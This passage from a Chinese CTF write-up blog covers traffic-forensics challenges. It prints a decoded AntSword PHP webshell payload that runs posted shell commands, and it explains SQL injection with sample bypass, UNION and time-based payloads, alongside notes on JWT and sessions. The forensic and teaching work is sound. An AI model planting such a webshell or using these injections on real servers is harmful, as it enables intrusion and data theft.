href="#陇剑杯-2021-jwt（问5）" class="headerlink" title="[陇剑杯 2021]jwt（问5）"></a>[陇剑杯 2021]jwt（问5）</h4><p>题目描述：昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：<br>黑客在服务器上编译的恶意so文件，文件名是_____________。(请提交带有文件后缀的文件名，例如x.so)。得到的flag请使用NSSCTF{}格式提交。</p><p>先尝试在过滤器全局搜索带有<code>.so</code>的分组数据包</p><p><img src="https://haslet007.github.io/img/image-20240921121305821.png" alt="image-20240921121305821"></p><p><img src="https://haslet007.github.io/img/image-20240921121332754.png" alt="image-20240921121332754"></p><p>找到这些流量包，进行追踪http流，在第22个流中发现<code>looter.so</code>相关的文件操作，flag得出</p><p><img src="https://haslet007.github.io/img/image-20240921121532963.png" alt="image-20240921121532963"></p><h4 id="陇剑杯-2021-jwt（问6）"><a href="#陇剑杯-2021-jwt（问6）" class="headerlink" title="[陇剑杯 2021]jwt（问6）"></a>[陇剑杯 2021]jwt（问6）</h4><p>题目描述：昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：<br>黑客在服务器上修改了一个配置文件，文件的绝对路径为_____________。（请确认绝对路径后再提交）。得到的flag请使用NSSCTF{}格式提交。</p><p>因为给的是黑客攻击流量，所有http的请求方法应该为“POST”，且Liunx系统下配置文件放在etc目录下，故筛选代码如下:<code>http.request.method==“POST”&amp;&amp;http contains “etc”</code>，追踪HTTP流，flag得出。</p><p><img src="https://haslet007.github.io/img/image-20240921122044224.png" alt="image-20240921122044224"></p><h4 id="EIS-2019-webshell"><a href="#EIS-2019-webshell" class="headerlink" title="[EIS 2019]webshell"></a>[EIS 2019]webshell</h4><p>无题目描述</p><p>首先查看协议分级，发现TCP&#x2F;HTTP协议居多，总的分组数目较少为134个</p><p><img src="https://haslet007.github.io/img/image-20240921122639892.png" alt="image-20240921122639892"></p><p>先从HTTP流量开始分析，过滤<code>http.request.method==POST</code>，追踪HTTP流POST请求</p><p><img src="https://haslet007.github.io/img/image-20240921125948849.png" alt="image-20240921125948849"></p><p>发现客户端是蚁剑，紧接着下面是chr编码，尝试编写脚本将chr编码解码为可识读的字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>) </span>&#123;</span><br><span class="line">@<span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;f5045b05abe6ec9b1e37fafa851f5de9&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> @<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">openssl_encrypt</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$out</span>), <span class="string">&#x27;AES-128-ECB&#x27;</span>, <span class="variable">$key</span>, OPENSSL_RAW_DATA)); </span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable">$output</span>=<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;8fc2b&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;bde96&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="variable">$p</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;0xc461e86196f1a&quot;</span>]);</span><br><span class="line"><span class="variable">$s</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;0x9ec3fa98a283f&quot;</span>]);</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>?<span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>:<span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$r</span>=<span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;,&quot;</span>,@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;disable_functions&quot;</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$d</span>)) &#123;</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">array</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;trim&#x27;</span>,<span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;strtolower&#x27;</span>,<span class="variable">$d</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>(<span class="title function_ invoke__">function_exists</span>(<span class="variable">$f</span>)&amp;&amp;<span class="title function_ invoke__">is_callable</span>(<span class="variable">$f</span>)&amp;&amp;!<span class="title function_ invoke__">in_array</span>(<span class="variable">$f</span>,<span class="variable">$d</span>));</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$ret</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">system</span>(<span class="variable">$c</span>,<span class="variable">$ret</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>,<span class="variable">$ret</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line"><span class="keyword">print</span>(@<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>));</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>,<span class="variable">$o</span>,<span class="variable">$ret</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">join</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>,<span class="variable">$o</span>));</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;popen&#x27;</span>)) &#123;</span><br><span class="line"><span class="variable">$fp</span>=@<span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line"><span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">2048</span>));</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;antsystem&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">antsystem</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="number">127</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="variable">$ret</span>=@<span class="title function_ invoke__">runcmd</span>(<span class="variable">$r</span>.<span class="string">&quot; 2&gt;&amp;1&quot;</span>);</span><br><span class="line"><span class="keyword">print</span> (<span class="variable">$ret</span>!=<span class="number">0</span>)?<span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span>:<span class="string">&quot;&quot;</span>;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="title function_ invoke__">asoutput</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>在代码中<code>AES-128-ECB</code>，不仅在第一个HTTP流中出现，在后面也多次出现，还出现了许多经过base64编码过的字符串，发现关键词<code>key</code>,<code>base64_encode</code>,<code>AES-128-ECB</code>，尝试将这些字符串当做密文解密，最终在第7个HTTP流中通过解密得到flag</p><p>第7个流解码后的php代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加密函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>) </span>&#123;</span><br><span class="line">    @<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&#x27;f5045b05abe6ec9b1e37fafa851f5de9&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> @<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">openssl_encrypt</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$out</span>), <span class="string">&#x27;AES-128-ECB&#x27;</span>, <span class="variable">$key</span>, OPENSSL_RAW_DATA));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">    <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;8c2b4&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;e2e10&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 从 POST 请求中获取并解码数据</span></span><br><span class="line">    <span class="variable">$p</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;0x1b4d456c7297d&quot;</span>]);</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;0xb9b45688a5a08&quot;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取当前脚本所在的目录</span></span><br><span class="line">    <span class="variable">$d</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构建命令，根据系统路径格式选择不同的命令</span></span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> ? <span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span> : <span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$r</span> = <span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 函数检测执行环境是否可以调用特定函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;,&quot;</span>, @<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;disable_functions&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$d</span>)) &#123;</span><br><span class="line">            <span class="variable">$d</span> = <span class="keyword">array</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$d</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;trim&#x27;</span>, <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;strtolower&#x27;</span>, <span class="variable">$d</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="title function_ invoke__">function_exists</span>(<span class="variable">$f</span>) &amp;&amp; <span class="title function_ invoke__">is_callable</span>(<span class="variable">$f</span>) &amp;&amp; !<span class="title function_ invoke__">in_array</span>(<span class="variable">$f</span>, <span class="variable">$d</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行系统命令</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$c</span>, <span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>, <span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">print</span>(@<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>, <span class="variable">$o</span>, <span class="variable">$ret</span>);</span><br><span class="line">            <span class="keyword">print</span>(<span class="title function_ invoke__">join</span>(<span class="string">&quot;\n&quot;</span>, <span class="variable">$o</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;popen&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$fp</span> = @<span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">            <span class="keyword">while</span> (!@<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">                <span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            @<span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;antsystem&#x27;</span>)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">antsystem</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$ret</span> = <span class="number">127</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 运行命令并捕获返回值</span></span><br><span class="line">    <span class="variable">$ret</span> = @<span class="title function_ invoke__">runcmd</span>(<span class="variable">$r</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    <span class="keyword">print</span>(<span class="variable">$ret</span> != <span class="number">0</span>) ? <span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span> : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">asoutput</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://haslet007.github.io/img/image-20240921150052321.png" alt="image-20240921150052321"></p><p>将运行结果进行base64解码得到flag</p><p><img src="https://haslet007.github.io/img/image-20240921150135693.png" alt="image-20240921150135693"></p><h3 id="TCP流"><a href="#TCP流" class="headerlink" title="TCP流"></a>TCP流</h3><p><strong>TCP流</strong>：在TCP协议中，每次客户端和服务器之间的通信会通过一个独立的TCP连接完成。Wireshark会为每个不同的TCP连接分配一个唯一的流编号（<code>tcp.stream</code>）。比如，客户端和服务器之间的一次完整的HTTP会话，或一个FTP文件传输会占据一个特定的TCP流。</p><p><strong>每个流中的数据</strong>：每个TCP流都包含了从连接建立（三次握手）、数据传输到连接断开的所有数据包。即使多个流在同一时间发生，每个流都是独立的。</p><p><strong>编号的分配</strong>：Wireshark会按照捕获到的TCP连接的顺序为每个流分配一个编号。编号从0开始，第一个TCP连接会被标记为 <code>tcp.stream eq 0</code>，第二个连接为 <code>tcp.stream eq 1</code>，依次类推。</p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p><strong>SQL注入</strong>（SQL Injection）是一种常见的网络攻击方式，攻击者通过在用户输入中嵌入恶意的SQL语句，操控数据库执行未经授权的操作。</p><p><strong>工作原理</strong>：</p><p>当应用程序没有对用户输入进行适当过滤时，攻击者可以将恶意的SQL语句插入到查询中。例如，登录页面的SQL查询：</p><p><code>SELECT * FROM users WHERE username = &#39;user_input&#39; AND password = &#39;user_password&#39;;</code></p><p>如果攻击者输入 <code>username=&#39; OR &#39;1&#39;=&#39;1</code>，SQL查询会变成：</p><p><code>SELECT * FROM users WHERE username = &#39;&#39; OR &#39;1&#39;=&#39;1&#39; AND password = &#39;&#39;;</code></p><p>由于 <code>1=1</code> 始终为真，攻击者可以绕过身份验证。</p><p><strong>常见的SQL注入类型</strong></p><p><strong>联合查询注入（Union-based SQL Injection）</strong>：</p><ul><li>利用 <code>UNION</code> 关键字，攻击者可以将两个查询的结果合并，从而在返回合法结果的同时获取数据库中的敏感信息。</li></ul><p><code>&#39; UNION SELECT username, password FROM users --</code></p><p><strong>布尔盲注（Boolean-based Blind SQL Injection）</strong>：</p><ul><li>通过向服务器发送不同的SQL语句，判断服务器响应是否改变，攻击者可以逐步推测出数据库中的数据。</li></ul><p><code>&#39; AND 1=1 -- (返回正常页面) &#39; AND 1=2 -- (返回错误页面)</code></p><p><strong>时间盲注（Time-based Blind SQL Injection）</strong>：</p><ul><li>通过构造包含时间延迟的SQL查询，攻击者可以根据响应时间的变化来判断查询是否为真。</li></ul><p><code>&#39; AND IF(1=1, SLEEP(5), 0) --</code></p><h3 id="JWT认证"><a href="#JWT认证" class="headerlink" title="JWT认证"></a>JWT认证</h3><p><strong>JWT</strong>（<strong>JSON Web Token</strong>）认证是一种用于验证用户身份和授权的机制，广泛应用于 Web 应用和 API 认证中。它通过生成一个加密的令牌来传递用户信息，避免了服务器存储会话数据，实现了无状态的认证方式。</p><p><strong>JWT 认证流程简述</strong>：</p><ol><li><strong>用户登录</strong>：<ul><li>用户使用凭证（如用户名和密码）进行登录，服务器验证凭证是否有效。</li></ul></li><li><strong>生成 JWT</strong>：<ul><li>验证成功后，服务器生成一个 JWT 令牌，通常包含用户的身份信息（如用户 ID）以及一些其他声明（如权限、过期时间等），并将其返回给客户端。</li></ul></li><li><strong>客户端存储 JWT</strong>：<ul><li>客户端将 JWT 存储在本地（如浏览器的 LocalStorage 或 Cookie 中），每次请求需要身份认证时，客户端会将 JWT 附带在请求头中（如 <code>Authorization: Bearer &lt;token&gt;</code>）发送给服务器。</li></ul></li><li><strong>服务器验证 JWT</strong>：<ul><li>服务器接收到请求后，解析并验证 JWT，确保令牌未被篡改（通过签名验证）。如果验证成功，服务器通过 JWT 中的用户信息完成授权操作。</li></ul></li><li><strong>用户授权</strong>：<ul><li>验证成功后，服务器允许用户执行特定的操作（如访问资源），无需再次进行身份验证，直到 JWT 过期。</li></ul></li></ol><p><strong>JWT 结构</strong>：</p><p>JWT 包含三部分，用<code>.</code>分隔：</p><ol><li><strong>Header</strong>（头部）：定义令牌类型和使用的加密算法。</li><li><strong>Payload</strong>（负载）：包含用户的身份信息和声明数据。</li><li><strong>Signature</strong>（签名）：用于确保令牌未被篡改，服务器通过加密算法生成签名。</li></ol><p>例如：<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</code></p><p>JWT 的优点：</p><ul><li><strong>无状态</strong>：服务器不需要存储会话信息，减轻了服务器压力。</li><li><strong>可扩展性强</strong>：可以携带多种用户信息，并可跨平台使用（如 Web、移动端等）。</li><li><strong>跨域认证支持</strong>：因为 JWT 通过 HTTP Header 传输，支持跨域场景。</li></ul><p>JWT 的缺点：</p><ul><li><strong>无法撤销</strong>：JWT 生成后，无法在服务器端主动撤销，直到它自动过期为止。</li><li><strong>安全风险</strong>：如果 JWT 被窃取，攻击者可以在有效期内冒用用户身份。</li></ul><p>JWT 认证通常用于无状态 Web 服务、API 授权、单页面应用（SPA）等场景。</p><h3 id="Token和Session辨析"><a href="#Token和Session辨析" class="headerlink" title="Token和Session辨析"></a>Token和Session辨析</h3><p>在HTTP请求中，<code>token</code> 和 <code>session</code> 是两种常用的身份验证和状态保持机制，但它们的工作方式和用途有所不同。我们来看一下它们的区别和<code>token</code>的作用。</p><ol><li><strong>Token 的作用</strong></li></ol><p>在这个请求中，<code>token</code> 是一种用于身份验证的机制，它通常是通过JWT (JSON Web Token) 生成的。Token 的作用主要是为了在无状态的环境中（如RESTful API）保持身份验证信息。Token 通常包含用户的相关信息（如ID、权限等），而且是经过签名的，因此可以验证其完整性和真实性。具体作用包括：</p><ul><li><strong>无状态认证</strong>：Token 可以在每次请求中携带，不需要在服务器端存储任何会话信息。</li><li><strong>跨平台</strong>：Token 可以在不同的客户端之间传递，比如Web应用、移动应用等。</li><li><strong>安全性</strong>：通过JWT加密，可以确保Token不会被篡改。</li></ul><ol start="2"><li><strong>Session 的作用</strong></li></ol><p><code>Session</code> 是一种服务器端的状态保持机制，当用户登录后，服务器会创建一个唯一的会话标识（<code>PHPSESSID</code> 在这个例子中就是会话ID），并在服务器端存储用户的状态信息。客户端只需要在每次请求中传递这个<code>PHPSESSID</code>，服务器就能识别出这个用户并恢复其状态。Session 依赖于服务器端的存储，因此有以下特性：</p><ul><li><strong>状态保持</strong>：服务器通过Session保存用户的登录状态、权限等信息。</li><li><strong>依赖服务器存储</strong>：所有的会话信息存储在服务器上，需要服务器管理Session的有效期和清理。</li><li><strong>容易管理用户会话</strong>：服务器可以轻松控制会话的过期和销毁。</li></ul><ol start="3"><li><strong>Token 与 Session 的区别</strong></li></ol><ul><li><strong>存储位置</strong>：Token 是无状态的，所有信息都包含在Token本身，客户端每次请求时都携带Token。Session 的信息存储在服务器，客户端只需携带会话ID（如<code>PHPSESSID</code>）。</li><li><strong>扩展性</strong>：Token 不依赖于服务器存储，因此在分布式系统中扩展性更好。而Session 依赖服务器存储，在负载均衡或分布式服务器环境下需要额外的工作来共享会话信息。</li><li><strong>安全性</strong>：Token 通常带有签名，可以防止篡改；而Session 需要服务器保护会话ID的安全。</li></ul><ol start="4"><li><strong>在请求中加 <code>token</code> 的作用</strong></li></ol><p>在HTTP请求中加<code>token</code>的目的是为了向服务器证明该请求的发送者是经过认证的用户。相比于仅使用<code>session</code>，<code>token</code> 可以让服务器在无状态的情况下，也能根据<code>token</code>中携带的信息来进行身份验证，提升API的安全性和可扩展性。</p><p>总结来说，在你提供的请求中，<code>session</code>（通过<code>PHPSESSID</code>）用于服务器端会话的状态保持，而<code>token</code> 则用于无状态的身份认证，它们可以互补使用。</p><h3 id="so文件"><a href="#so文件" class="headerlink" 